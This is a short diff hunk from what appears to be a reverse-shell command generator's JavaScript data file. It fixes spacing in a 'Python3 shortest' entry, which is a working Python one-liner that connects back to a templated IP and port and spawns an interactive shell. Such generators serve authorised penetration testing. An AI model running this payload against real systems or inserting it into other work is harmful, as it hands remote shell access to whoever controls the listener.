@@ -200,7 +200,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "Python3 shortest",
-            "command": "python3 -c'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+            "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
             "meta": ["linux"]
         },
         {
